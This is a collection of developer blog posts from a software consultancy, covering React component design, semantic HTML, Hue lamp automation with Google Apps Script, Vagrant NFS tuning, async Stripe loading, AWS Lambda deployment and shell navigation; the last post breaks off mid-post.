✔︎ Function can be unit tested directly from the service, without involving the component

Atomic Design

Follow the “Atomic Design Methodology”

Components will be small enough (200 lines max) to be easily understandable
Components can be found easily and the architecture is straightforward for newcomers



Bad Example
// MyPage.js
import { MyComponent1, MyComponent2, MyField1, Myfield2 } from '@components'

export default class MyPage extends PureComponent {
   render() {
      <div>
         <MyComponent1 />
         <div>
            <MyField1 />
            <MyField2 />
            <MyField1 disabled />
            <MyField2 color={'blue'} />
         </div>
         <MyComponent2 />
      </div>
   }
}

export const MyPageContainer = connect(mapStateToProps)(MyPage)


✗ Components are all coming from the same folder
✗ If the page needs to be modified, new components will be created in the same folders without thinking of refactoring
✗ Component may end up being really long
✗ The structure of the page is not easily understandable

Good Example
// MyPage.js
import { MyOrganism1, MyOrganism2, MyOrganism3 } from '@organisms'

export default class MyPage extends PureComponent {
  render() {
     <div>
        <MyOrganism1 />
        <MyOrganism2 />
        <MyOrganism3 />
     </div>
  }
}

// MyOrganism1.js
import { MyMolecule1, MyMolecule2 } from '@molecules'

export default class MyOrganism1 extends PureComponent {
  render() {
     <div>
        <MyMolecule1 />
        <MyMolecule2 />
     </div>
  }
}

// MyMolecule1.js
import { MyAtom1, MyAtom2 } from '@atoms'

export default class MyMolecule1 extends PureComponent {
  render() {
     <div>
        <MyAtom1 />
        <MyAtom2 />
     </div>
  }
}


✔︎ Page Component structure is understandable at first sight
✔︎ When working on the Page again, it is easy to see if some components can be reused
✔︎ For a new developer, it is easy to understand right away
✔︎ Components stay small and easily testable

Selectors and Reselectors

Use selectors and reselectors

Components will handle only a few props (10 props max) to be easily understandable
Components will be completely decoupled from the shape of the store
Performance will be increased in case of computed derived data, thanks to reselectors memoisation
Selectors and reselectors can be easily tested



Bad Example
// Table.js
import ...

export default class Table extends PureComponent {
   constructor(props) {
      super(props)
      this.renderTable = this.renderTable.bind(this)
      this.calculateNewProps(...props)
   }
   
   componentWillUpdate(nextProps) {
      this.calculateNewProps(...nextProps)
   }
   
   calculateNewProps = (prop1, prop2, ..., prop15) => {
      // Logic that modifies the store for the table rendering
   }
   
   renderTable() {
      // Return JSX based on props
   }

   render() {
      this.renderTable()
   }
}

Table.propTypes = {
   prop1,
   prop2,
   ...
   prop15,
}

const mapStateToProps = state => {
   prop1: state.object.prop1, 
   prop2: state.object.prop2,
   ...
   prop15: state.object.prop15,
}

export const TableContainer = connect(mapStateToProps)(Table)


✗ Component has too many props, it is really dependent on the store shape
✗ Component is too long (was 300+)
✗ Component is updating the store in its own lifecycle, which can cause race conditions

Good Example
// Table.js
import ...
import { getTableRows } from '@selectors'

export default class Table extends PureComponent {
   renderTable() {
      // Return JSX based on rows
   }

   render() {
      this.renderTable()
   }
}

Table.propTypes = {
   tableRows,
}

const mapStateToProps = state => {
   tableRows: getTableRows(state),
}

export const TableContainer = connect(mapStateToProps)(Table)

// selectors.js
import { createSelector } from 'reselect'

export const getTableRows = createSelector(
   getProp1,
   getProp2,
   ...,
   getProp15,
   (prop1, prop2, ..., prop15) => {
      // logic to return the table rows based on the props in the store
   }
)


✔︎ Component is completely decoupled from stores shape
✔︎ Component does not have any logic, its job is to render objects
✔︎ Component is easy to read or revisit
✔︎ Selector (data formatting) can be easily tested!

Functions inside render

Never create functions into the render(), use arrow functions

Functions defined into onClick or onChange methods will be recreated every time the action is triggered, causing rerendering and performance impact
Component will not rerender if the arrow function is defined outside of the render()
Arrow function have access to this without needing to be bound in the constructor



Bad Example
// MyPage.js
import doSomething from '@services'

export default class MyPage extends PureComponent {
   render() {
      <div>
         <Button onClick={() => doSomething(this.props.param))} />
      </div>
   }
}

MyPage.propTypes = {
   param,
}


✗ Function is defined inside the render, a new instance will be created even if the props do not change
✗ Performance loss

Good Example
// MyPage.js
import doSomething from '@services'

export default class MyPage extends PureComponent {
   onClick = () => doSomething(this.props.param)

   render() {
      <div>
         <Button onClick={this.onClick} />
      </div>
   }
}

MyPage


✔︎ Function is defined outside of the render function
✔︎ The component will render only once for a given param
✔︎ The function onClick does not need to be bound, because the arrow function gives access to this


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Pasteau
  			
  				Agile Engineer at Theodo UK  			
  		
    
			

									"
"
										TL;DR: try this security tool it’s awesome.
I was looking for best practices to secure docker applications. One of those best pratices is to make sure the host is secured and well configured. The main advice was to read the best pratices from the Center for Internet Security. This organisation provides very actionnable recommandations on how to secure your OS. It also produces a very nice tool (which require java) that you run on the server you want to check. This tool generates a detailled report describing all the security flaws and their fixes.
Testing the CIS tool on your Vagrant
You can quickly test it locally on your Vagrant following those steps:

Install java on your Vagrant. If you use Ansible provisioning you can use this role
After downloading the tool, extract the files and move it to your Vagrant
Enable the SSH X11 forwarding for your Vagrant
SSH into your vagrant and run the program. If your server is a Linux one,  run with sudo rights `CIS-CAT.sh`
Select “server 2” option to have a complete report

Start the check of the OS. You should see something like this:

You are done. To have an example of what you can get, see the report I got for my side project. Here is the scoring part of the report:



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										If you ever used React you may have noticed that you can easily forget how to write a static webpage because it adds a layer of abstraction that changes the way the page is created. But in the end, all code written in JSX will generate a classic DOM. In this article I’ll show you mistakes I made and why it is important to write good HTML in Single Page Apps.
 
The unresponsive file input
Context : Creating a button to upload files on a website.
How we did it:
We used a <input type=""file""> HTML input. Then we added an eventListener  onChange  which called a handleChange function  that adds the uploaded file as a base64 in component’s state. Then, to delete it, we binded a function removeUploadedFile on click of a button and the file was removed from the list of uploaded file in the state. This is the natural “React way” to create the feature.

class UploadButton extends Component {
  handleButtonCLick = () => {
    this.refs.fileUploader.click();
  }
 
  handleChange = (event) => {
    this.props.handleFileUpload(event);
  }
 
  render() {
    return (
 
      <div style={styles.container} onClick={this.handleButtonCLick} >
        <input type=""file"" onChange={this.handleChange} style={styles.input} accept={acceptedFileTypesForUpload.join(',')} />
        <AddIcon color={COLORS.BLUE} style={styles.icon} />
      </div>
 
    );
  }
}

What went wrong :
We noticed that sometimes, uploading a document had no effect on our component’s state. We had to spend some time to reproduce the bug : It happened when we added a document, then immediately removed it and added it again. During the last step, the document was not added to the state.
What happened :
The chosen implementation focuses only on the React mechanisms and does not take into account the underlying HTML. Indeed, any HTML input file has a value property associated with it that contains the information of the last document added in the input. But our implementation was only concerned with updating the React state of our component without taking care of this property.
So, when a document was removed, it was taken off the list in the state but not from the “value” property of the input. If we tried to add it again, the value parameter of the input did not change since the doc was already there and the onChange was not triggered.

class UploadButton extends Component { 
  handleChange = (event) => {
    this.props.handleFileUpload(event);
    this.refs.fileUploader.value = ''; // this fixed the bug

 
Everyone hits Enter to submit a form
Context : An authentication form that is not submitted by pressing “Enter” key.
How we did it:
We used two TextField from the library MaterialUI to request username and password and a button to validate. The button had an onClick property that calls a function which triggers an API call to connect the user.

render() {
    return (
        <div>
          <TextField
              id=""username""
          />
          <TextField
              id=""password""
              type=""password""
          />
          <button onClick={this.submitForm}>
              Submit
          </button>
        </div>
    );
}

What happened :
Here too,  using functions of React component called through event listener bypassed the usual way in which a form must be built in HTML ie with <form> tags and a <input type=submit> in the end. This was the right way to create our login form :

render() {
    return (
        <form onSubmit={this.submitForm}>
            <TextField
                id=""text-field-default""
                defaultValue=""Default Value""
            />
            <input type=""submit"" value=""Submit"" />
        </form>
    );
}

Thus usual features (such as validation with input) are missing. It is possible to reinvent them for example with a KeyEventListener here, but what is the point then ?
 
Keep the web semantic!
Context : Reproduce a button by adding an onClick property on a div for example
The problem that arises in this case is that the semantic web is not respected. The semantic web is a set of standards that allow search engines to transform textual information (HTML pages) into machine-readable data.
In this context a <div> tag will be interpreted as an element that contains information and not as an interface element. Thus, using a div tag as a button distorts search engine interpretation and therefore SEO.
Here are some examples of what you should and shouldn’t do:

❌ <div onClick=""function"">Button</div>
✅ <button onClick=""function"">Button</button>

❌ <div onClick=""function"">Link</div>
✅ <a href=""link"">Link</a>

❌ <div style=""list"">
    <div style=""list-elem"">1</div>
    <div style=""list-elem"">2</div>
   </div>
✅ <ul style=""list"">
    <li style=""list-elem"">1</li>
    <li style=""list-elem"">2</li>
   </ul>

An other frequent mistake comes from the React obligation to enclose components in a unique HTML tag. <div> tags are often added to the DOM structure for no other reason. To prevent that, React introduced Fragments in version v16.2.0. These allow to group many childs in a component without adding an extra tag :

render() {
  return (
    <React.Fragment>
      <li />
      <li />
      <li />
    </React.Fragment>
  );
}

It is even possible to write shorter Fragments tags like this (not supported by all tools)

render() {
  return (
    <>
      <li />
      <li />
      <li />
    </>
  );
}

 
Conclusion
As you can see there are many reason for writing good HTML and it is also very important for one (often forgotten) reason : accessibility.
Accessibility refers to the possibility for people with disabilities to read, understand, navigate and interact with your website. And many features around accessibility (tab navigation, ARIA) are actually based on HTML features. If all your React components are enclosed in useless HTML tags, you’ll turn tab navigation into hell for your disabled users.
A good start the tackle these issues is to install linters like eslint which provide plugins for accessibility: eslint-plugin-jsx-a11y. React is a very powerful tool, but don’t forget the basics!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Elie Dutheil
  			
  				  			
  		
    
			

									"
"
										This article is about IOT, DIY and lamps, and a little bit of lean.

So 2 weeks ago we bought some lamps! And since we are a bunch of nerds we bought a bridge to play with them.
I am not going to hide the brand to make this article clearer.
So we had this lamp and this bridge


And then we wondered what we could do with it 😐 .
We love our clients
Every week, the scrum team of a project asks their client if they are satisfied with 3 questions:
1) How do you feel about the speed of the team?
2) How do you feel about the quality of the collaboration with Theodo?
3) Would you recommend Theodo?
Depending on the answer there are 3 categories:

KO: red bucket, the client is not satisfied we need to react
OK: the client satisfaction meets our standard
Wahou!: the client gave us the perfect grade

We had our idea! We are a lean company, we want indicators. Whenever a client fills the google form, we are going to change the lamp color according to the result 😀 .
How do we do this ?

Here is the plan:

Configure the lamps in the office
Expose the API so we can control it from anywhere
Create a hook on our google form to call the API and thus control the lamp

— easy —
Configure your office lamps
1) Plug the lamps
2) Plug the bridge to your router
3) Download the HUE app to see if everything is connected
4) Play with the lamps because you are a child
Access the API of the bridge
1) Connect to the same wifi the bridge is on
2) Go here to get the IP address of your bridge
[
    {
        id: ""skjdhfskdjfhskkjdf"",
        internalipaddress: ""192.168.1.107""
    }
]

3) We want to play with the API: copy the ip in the url and add /debug/clip.htm: mine is http://192.168.1.107/debug/clip.html
4) We need a token to be authenticated: copy the following body in the message body part (but change the name, you are not Sammy)
{""devicetype"":""my_hue_app#nexus Sammy""}


5) Click post – it will say there is an error because you need to press the button of the bridge before getting an access, so click on the button of the bridge and click post again
6) You now have a Token! (if you had trouble having a token read this).
We can now turn the light on and off! Or change its color more fun. Here is the doc.
What we will use is this request:
Address    http:///api//groups/0/action
Body    {""on"":true,""bri"":255,""sat"":255,""hue"":12345}
Method    PUT

Change the color when a new form is submitted
Now let’s say you have a Google form (create one just for fun).
We are going to put a small Google script to run a function when a new form is submitted.
If you know nothing in Google script it is ok, it is javascript.

On the form, click on the menu on the right hand top
Select “Script Editor”
And then paste and adapt this code:
function changeLightColors(colorCode) {
  var formData = {
    ""hue"": colorCode
  }

  var options = {
   'method' : 'put',
    'payload' : JSON.stringify(formData)
  }
  var url = ""http://7b581ba2.ngrok.io/api/put-your-token/groups/1/action""
  UrlFetchApp.fetch(url, options)
}

Here is the code we call each time there is a new form submitted
function isNewFormOK(newForm) {
  response = newForm.response.getItemResponses()
  speed = parseInt(response[0].getResponse()[0])
  colab = parseInt(response[1].getResponse()[0])
  reco = response[4].getResponse()
  if ((speed + colab > 7) && (reco === 'Yes, absolutely')) {
    if (speed + colab === 10) {
      changeLightColors(24173)
    } else {
      changeLightColors(8464)
    }
  } else {
    changeLightColors(65423)
  }
}

BUT!
In the changeColorLight function we fetch a weird URL. That’s right, we need to access our hue bridge from the outside world, while the bridge is only on our local wifi. One way to do it is openning a http tunnel with Ngrock
Access the lights from the outside world
Fix the local ip address of the bridge
DHCP might change the bridge adress every now and then, you don’t want that. Look up in google: {{your router model}} assign static IP. Fix the ip address of the bridge.
Access the bridge from the outside
If like me you don’t have a fixed ip address because your internet provider does not want you to! There is a free solution: 

install beame-instal-ssl
run beame-insta-ssl tunnel make --dst 192.168.0.4:80 --proto http (replace the static ip of your bridge)
you now see an beame url you can access !

Beame is nice because you get to keep the address even if you relaunch the tunnel.
Configure an IOT Hub
Now, maybe your computer won’t always be on the same wifi than the lights.
First, fix the local IP of your hub so it does not change when you restart your router (look for DHCP reservation + your router brand).
You can run the tunnel on a raspberry pi:

create a file launch-tunnel.sh in the pi directory
in the file, write: sudo -u pi /usr/bin/beame-instal-ssl tunnel make --dst 192.168.1.4:80 --proto http > /home/pi/beame.log & (replace with the local IP of your hub of course)
in /etc/rc.local add /home/pi/beame-tunnel.sh
access the beame url of your tunnel to make sure it works


Watch the status of your IOT Hub with a simple HealthCheck
There are many services that provide healthcheck reports.
I chose a simple google script that checks every hours the status of my endpoint. If the response is 200, do nothing, else send me a mail.
To create a google script:

Open a new google spread sheet
tool -> open script editor
in the script editor copy this code (replace the URLOFIOTHUB and YOUREMAILADDRESSS):

function healthCheck() {
  url = ""https://URLOFIOTHUB""
  thereIsAnIssue = false
  try {
    response = UrlFetchApp.fetch(url)
    if(response.getResponseCode() != ""200"") {
      thereIsAnIssue = true
      issue = ""IOT Hub response was not 200 but "" + response.getResponseCode()
    }
  } catch(e) {
    thereIsAnIssue = true
    issue = e
  }

  if(thereIsAnIssue) {
    sendIssueMail(issue, url)
  }
}

function sendIssueMail(issue, url) {
  message = ""There was an isue with the IOT Hub.\n""
  message += ""The following url has an issue: "" + url + ""\n""
  message += ""The issue was the following: "" + issue + ""\n""
  message += ""You may try to reboot the IOT Hub, behind the orange fridge.""
  Logger.log(message)
  email = {
    to: ""YOUREMAILADDRESSS"",
    replyTo: ""YOUREMAILADDRESSS"",
    subject: ""IOT Hub is down!"",
    htmlBody: message
  }
  MailApp.sendEmail(email);
}

Test the code with a fake url:

Replace the url by a fake one that should not exist
in the menu bar select HealthCheck() function
run the function by clicking the little play arrow
Receive the mail

Automate the check:

In the script go to Edit -> triggers
Add a new trigger healthCheck() run it hourly (or as you prefer)
You are done 😉 unplug your raspberry pi or kill your tunnel and wait for an email

Alright! You are ready to do awesome stuff! In part 2 of the article I’ll show how to plug webhooks of github and CircleCi so you see red lights when your deployment fails :O, see the GIF.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sammy Teillet
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Bonjour à tous,
Nous organisons tout l’été des cours sur React au sein de Theodo. Cette 3ème session aura lieu le mercredi 2/08/2017 à 19h dans nos locaux près du métro Rome. Nous l’ouvrons aux personnes extérieures qui souhaitent apprendre à mieux maîtriser ce framework Javascript. Elle sera sur le thème de la mise en place de Redux et sera dirigée par un de nos experts React Woody Rousseau ici en conférence à React Amsterdam.

La formation est gratuite et limitée aux 10 premières personnes qui s’inscriront. Une connaissance des bases de React est requise. Vous êtes les bienvenus et pour vous inscrire c’est par ici.
À mercredi,
Maxime

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										Do you wish your vagrant synced folders to have better performance? Especially if your host machine is running Linux. Here are some tricks to speed it up.
Set up a synced folder
Vagrant is a convenient tool for quickly setting up your dev server, with just one vagrant up from the command-line, every team member can test new features locally.
For me, it is also essential to have a shared folder for the app’s source code so that I can test my feature by simply saving the file from my favorite IDE and not having to deploy the code into the virtual machine every time.
Setting up a basic synced folder is ridiculously easy as it only requires to add the following line in the Vagrantfile:
config.vm.synced_folder ""src/"", ""/srv/website""
with:

""src/"" synced folder path on your host
""/srv/website"" synced folder path on your guest

Without additional options, Vagrant will delegate the set up to your virtualization backend, e.g Virtualbox or VMware. Unfortunately, it is sometimes very slow.
Vagrant synced folders provides three alternatives:

NFS (Network File System): default remote file system for Unix.
RSync: slower than NFS, you would use it if nothing else works. Plus, rsync is one-way only.
SMB (Server Message Block): only works with a Windows host.

Using NFS is therefore the best alternative in most situations.
Vagrant NFS
To set up an NFS synced folder you need to have nfsd (NFS server daemon) installed on your host and to specify it in your Vagrantfile as:
config.vm.synced_folder ""src/"", ""/srv/website"", type: ""nfs""
When you reload your VM with vagrant reload, vagrant will do three things:

It will add an entry in the nfsd’s configuration file /etc/exports on your host.
It will reload the NFS server daemon which will read the /etc/exports and accept connections.
It will connect to your guest machine and mount the remote folder.

Boost your NFS
Now, you might be happy with the default options. But sometimes, especially if you are a Linux user, you might feel that it is too slow. Luckily, Vagrant has a set of available options so let’s tweak the NFS configuration a bit.
The NFS options that impact the speed of the synced folder can be separated in two categories:

Mount options (guest side):

""udp"" -> ""tcp"": The overhead incurred by TCP over UDP usually slows things down. However, it seems that the performance are slightly better with TCP in this particular case. (speed x1.5)


NFSd options (host side):

""sync"" -> ""async"": in asynchronous mode, your host will acknowledge write requests before they are actually written onto disk. With a virtual machine, the network link between the host and guest is perfect so that there is no risk of data corruption. (speed x3)



If you want to override one option, you also need to write all the other default options. The optimal configuration in my situation is therefore:
config.vm.synced_folder ""src/"", ""/srv/website"", type: ""nfs"",
 mount_options: ['rw', 'vers=3', 'tcp'],
 linux__nfs_options: ['rw','no_subtree_check','all_squash','async']
Feel free to test which options work best for you.
With this setup, reloading a page of my app went from 9 to 2 seconds, making my work much easier. Moreover, I can finally access the legacy part of my application which timed out before.
Vincent Langlet, agile web developer at Theodo
Note: File transfer speed can be easily measured with the dd utility :
dd if=/dev/zero of=./test bs=1M count=100

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Hugo Lime
  			
  				Agile Web Developer at Theodo.

Passionate about new technologies to make web apps stronger and faster.  			
  		
    
			

									"
"
										On my current project, the team (and our client 😱) realised our React website performance rating was below industry-standard, using tools like Google Page Speed Insights.
As reported by the tool, the main cause for this are render-blocking scripts like Stripe, Paypal, fonts or even the bundle itself.
Let’s take Stripe as example.
The API of services like Stripe or Paypal are only available by sourcing from a <script /> tag in your index.html.
In the React code, the library becomes accessible from your Javascript window object once the script has loaded:
<!-- ./index.html -->
<script src=""https://js.stripe.com/v2/""></script>

// ./somewhere/where/you/need/payment.js
const Stripe = window.Stripe;
...

The solution is to delay the loading of the script (async or defer attributes in the <script />) to let your page display faster and thus get a better performance score.
But a problem happens when the bundle loads: the script may still not be ready at load time, in which case you won’t be able to get its value from window for further use.
<!-- ./index.html -->
<script src=""https://js.stripe.com/v2/"" async></script>

// ./somewhere/where/you/need/payment.js
const Stripe = window.Stripe;

const validationFunctions = {
  ...
  validateAge: age => age > 17,
  validateCardNumber: Stripe.card.validateCardNumber,
  validCardCVC: Stripe.card.validateCVC,
  ...
}

Result in the console:

With this code, Stripe can’t be loaded after the bundle. Your bundle crashes!



But what is the impact of solving this problem?
Business benefits of delaying the loading of your script

Your website loads faster which leads to better customer retention
Your website gets better SEO visibility…
… as proven by your better mark on performance benchmarks like Google Page Speed Insights

Objective measures of your abilities are rare, take this opportunity to blow your client/stakeholder/team’s mind!
“But what good does Google Page Speed Insights?” See below for yourself!
Before loading asynchronously. Here’s how we ranked in the beginning:

6 scripts are delaying the loading of our website. We want to get rid of all those items.

Result after loading all scripts asynchronously: render blocking scripts have disappeared!
Score on mobile is now 83/100 up from 56/100, and desktop performance is more than 90!

The Solution
index.html
<!-- Load the script asynchronously -->

<script type=""text/javascript"" src=""https://js.stripe.com/v2/"" async></script>

./services/Stripe.js
  // 1) Regularly try to get Stripe's script until it's loaded.

const stripeService = {};
const StripeLoadTimer = setInterval(() => {
    if (window.Stripe) {
      stripeService.Stripe = window.Stripe;
      clearInterval(StripeLoadTimer);
    }
}, 100);

// Customise the Stripe object here if needed

export default stripeService;

./somewhere/where/you/need/payment.js
// Use a thunk where an attribute of your Stripe variable is needed.

import stripeService from './services/stripe';

const validationFunctions = {
  ...
  validateAge: age => age > 17,
  validCardNumber: (...args) => stripeService.Stripe.card.validateCardNumber(...args),
  validCardCVC: (...args) => stripeService.Stripe.card.validateCVC(...args),
  ...
}

Why this architecture?
We have assigned the Stripe variable in a ./services/Stripe.js file to avoid re-writting the setInterval everywhere Stripe is needed.
Also, this allows to do some custom config of the Stripe variable in one place to export that config for further use.
Why use thunks?
At bundle load time, the Stripe variable is still undefined.
If you don’t use a thunk, Javascript will try to evaluate at bundle load time the attributes of Stripe (here, Stripe.card for example) and fail miserably: your website won’t even show.
Why use this weird stripeService object?
In ES6, export exports a live binding to the variable from the file it was created in.
This means that the variable imported in another file has at all times the same value as the one in the original file.
However there is an exception: if you used the Stripe = window.Stripe and export default Stripe; syntax as usual, you only export a copy of Stripe evaluated at bundle load time and not a binding to the variable itself. So in that case you don’t get the result of the assignment that happens in the setInterval after the <script /> is loaded if you merely export window.Stripe.
The airbnb-linter-complient trick to overcome this (thanks Louis Zawadzki!) is to wrap window.Stripe in a stripeService object.
You are all set on the path to 100/100 performance!




										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Félix Mézière
  			
  				Agile Web Developer at Theodo  			
  		
    
			

									"
"
										The purpose of this tutorial is to automatically deploy a serverless API with two deployment environments (development and production) from scratch. Using the Amazon Web Services (AWS), this will be a matter of minutes! We will use Node.js and several tools which all come with a freemium model:

AWS Lambdas are functions in the cloud that can be triggered without bothering with the infrastructure. You upload your code to AWS and it can be run anytime with high availability on any of their servers. Need more resources? No problem, Amazon scales for you. Idle time? Don’t pay for it anymore, you only pay when your API is called.
AWS API Gateway helps you manage and version APIs and makes it easy to connect incoming requests with Lambda functions.
Travis CI enables you to automatically test and deploy your code from Github.
You can as well use any other continuous integration (CI) tool, such as CircleCI.

A repo with all needed scripts is available on my Github, but I will walk you through the three main steps to setup your API:

have a working application online running the code of your choice,
make continuous deployment happen: let any change of your code on Github automatically deploy to the API,
deal with several environments: one for production, one for development.

Setup your Lambda and your API
First set up an account on AWS. It needs up to 24 hours to be authorized. You may have to enter your credit card details, but no worries: AWS Lambda’s free tier includes among other things 1 million free requests per month!
Your first Lambda
To begin with, we’re going to set up our very first Lambda function. On the upper panel of the AWS management console, select Lambda > Create a Lambda function > Blank function.
In the true tradition of computer programs, our application will output a fancy ‘Hello world’. When you’re asked to type in the function code, use a hello-world template. It follows the callback logic that Lambda functions use:
exports.handler = (event, context, callback) => {
  callback(null, {
    Hello: 'World'
  });
};

Your first API
For the next operations, you’ll need to go to the Amazon API Gateway and create a Hello World API from scratch (Create API > New API). Create a /hello-world resource (Actions > Create resource) and a GET method linked to our freshly created Lambda function (Actions > Create method > Integration type: Lambda function).
You’ll notice that the Amazon console is pretty intuitive. If you get stuck however, I strongly recommend you this excellent walkthrough on building an API to expose a lambda function. AWS resources are particularly well-made and fully comprehensive, so don’t hesitate to go through the documentation.
See your app in production!
Let’s deploy our work in production! On the API Gateway, go to Actions > Deploy API, create a production stage and… simply deploy by clicking the button.
On the stage editor screen, Amazon provides you with the invoke URL. Call your newly created API by typing said URL with the route /hello-world in your browser or use CURL to make a GET request.
Make deployment automatic using Travis CI
Now that the configuration is over, let’s start with the code already! If you browse the project, you’ll notice two main folders:

./lambda contains the index.js with your function code as well as the Node dependencies in the package.json.
./scripts contains the deployment script that Travis will use to update your function’s code at each new commit.

Create these two folders : mkdir lambda && mkdir scripts
I recommend you work on your own repository, so you learn to set it up by yourself. Begin by setting up a Git repository (git init) and a Node project with cd lambda && npm init -y.
Fill the code you want AWS to execute in ./lambda/index.js.
Deployment script
In ./scripts/aws-lambda-deploy, you will write the code for automatically updating a Lambda function.

It loads all necessary packages including the node package for the AWS SDK and configure your region.

const AWS = require('aws-sdk');
const Promise = require('bluebird');

const lambda = new AWS.Lambda({
  region: 'us-west-2'
});


It zips the folder containing the Lambda function.

const cwd = process.cwd();
const zipLambdaCommand = `
  cd ${cwd}/lambda/${lambdaName}/ &&
  npm install --production &&
  zip -r ${lambdaName}.zip * --quiet`;


It updates the Lambda function’s code.

const lambdaUpdateFunctionCodeParams = {
  FunctionName: `${lambdaName}`,
  Publish: true,
  ZipFile: read(`${cwd}/lambda/${lambdaName}/${lambdaName}.zip`)
 };
lambdaUpdateFunctionCode(lambdaUpdateFunctionCodeParams);

I prefer using promises instead of callbacks, so I promisify them using Bluebird. Then, all what the script does is chain both promises to zip und update the Lambda’s code.
I added a few console.log and also caught exceptions.
Travis will then execute the script as stated in the travis.yml:
deploy:
  - provider: script
    script: node scripts/aws-lambda-deploy.js hello-world production
    skip_cleanup: true
    on:
      branch: master

Setup Travis CI
Once you have all your code on a repository on Github, it’s easy to add it from Travis by going to your Travis profile and flicking the switch on corresponding to your repository. If you’re a complete beginner with Travis, you may want to have a look to an introduction.
Travis needs to be granted access to AWS in order to execute the deployment script. The two credentials that it needs to communicate with AWS (namely AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY) are to be found on the AWS console in My security credentials > Access keys. They are then stored in Travis as environment variables which you can set up and encrypt by clicking on Travis in More options > Settings.
Now, each time you will commit your code, Travis will launch the tests and automate the deployment to AWS. Make a small change in your code, commit it and see by yourself what happens when browsing to the invoke URL of part 1.
Manage deployment environments
Making code deploy to AWS is really cool, but clearly not sufficient if you want to develop and test new ideas for your API. We’d definitely need two environments: one for production and one for development, so your application is always available when you develop new features.
Configure two levels of code on the Lambda
On the Lambda console, at the lambda level, it is possible to configure aliases which will make the Lambda point to either production’s or development’s level of code.
Do this by going to your lambda > Actions > Create alias, and create both production and development aliases, which should both point to a certain version of your code (e.g., version 1).
Configure two stages on the API
On the API Gateway console, in addition to the production stage, add a new stage to your API Gateway by clicking on your API > Stages > Create > Stage name: development.
We will use a stage variable to distinguish between production and development, and let the API trigger the Lambda with the corresponding alias. For both stages (production and development), set the NODE_ENV stage variables by navigating to the stage name > Stage variables > Add stage variable.
Type in NODE_ENV as name, and set a value of PRODUCTION for the production stage and DEVELOPMENT for the development stage.
The GET method shall now be edited in order to point to the requested stage. On the right panel, go to Resources > GET > Integration request > Lambda function and edit it. But this time, make sure you enter the name of your Lambda function concatenated with the alias: hello-world:${stageVariables.NODE_ENV}.
Note: At this point, you will have to launch a command in order to extend your function’s permissions.
Amazon will kindly notify you by a popup, saying the API Gateway should be allowed to invoke the Lambda function. Configure your CLI and launch the said command for the functions hello-world:development and hello-world:production.
But how will the API Gateway pass this NODE_ENV variable? For that matter, you have to set the body mapping template by navigating to Add mapping template > application/json and enter the following code:
#set($allParams = $input.params())
  {
    ""stageVariables"": {
      #foreach($key in $stageVariables.keySet())
        ""$key"" : ""$util.escapeJavaScript($stageVariables.get($key))""
        #if($foreach.hasNext),#end
      #end
    }
  }

Deploy on each environment
In addition to updating the Lambda’s code, the deployment script shall also update the alias corresponding to the git branch that is being changed.
const lambdaUpdateAliasParams = {
  FunctionName: `${lambdaName}`,
  Name: lambdaAlias,
  FunctionVersion: lambdaVersion
};
lambdaUpdateAlias(lambdaUpdateAliasParams);

On Git, each deployment environment corresponds to a certain branch. The branch master will deploy to production, and the branch develop to development. This appears in the travis.yml where we now automate the deployment for both environments:
  - provider: script
    script: node scripts/aws-lambda-deploy.js hello-world development
    skip_cleanup: true
    on:
      branch: develop

Create the new branch for the development environment (git co -b develop), make a small change in the function’s code, and push it to Github.
Wait for Travis to do its magic. You can check the deployment did not fail on Travis console. Once the build passed, if you go to the invoke URLs of each stage, you’ll see the changes corresponding to each environment!
Conclusion
Amazon provides you with a panel of services that integrate well with Lambda functions and the API Gateway. It goes from machine learning to logging tools or queuing services, and will help you in designing the best APIs. Possible future features for the API we just conceived are:

have different environment variables for each stage,
encrypt the environment variables on AWS,
schedule or define triggers to run your API at your convenience,
manage and organize logs.

In addition to that, many frameworks can now help you manage and deploy your Lambda web services, such as Serverless, Apex, or Zappa if you prefer using Python.
In serverless computing, you concentrate on coding simple functions instead of handling complex HTTP requests or focusing on architecture’s issues. Automatic deployment, as we saw it, makes your application available for production and development in a few clicks. Making your own backend API and interacting with other APIs is a matter of minutes!
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre Marcenac
  			
  				Web developer at Theodo  			
  		
    
			

									"
"
										The most famous shell command is definitely cd. It allows you to navigate through your file tree.
Sometimes, reaching the targetted folder can be a painful journey leading to a laborious and infinite sequence of cd and ls.
Thankfully, some workarounds exist to make navigation less laborious, let us mention three of them:

Enable autosuggestion in your favorite shell
Open an integrated terminal within the targetted folder from the file explorer
Set up an alias in the .{zsh, bash}rc file to store a given command

None of these approaches is really satisfying from a web developer’s perspective as it can quickly get time-consuming.
How about we could cd into any folder with one single command? Let me introduce you Z.
Z is a shell script that will learn from your shell history in order to get you to your favorite folders with one command.
The word ‘favorite’ has to be defined here: the most frequent and recent. Z is based on the ‘frecency’ concept widely used in the Web World to build a proper and consistent URIs ranking.
To put it simply, Z attributes a mark to all the folders you have visited with your shell since Z was installed.
Installation
Are you ready to save a lot of time? Let’s install the beast.
Clone the Z github project on your machine:
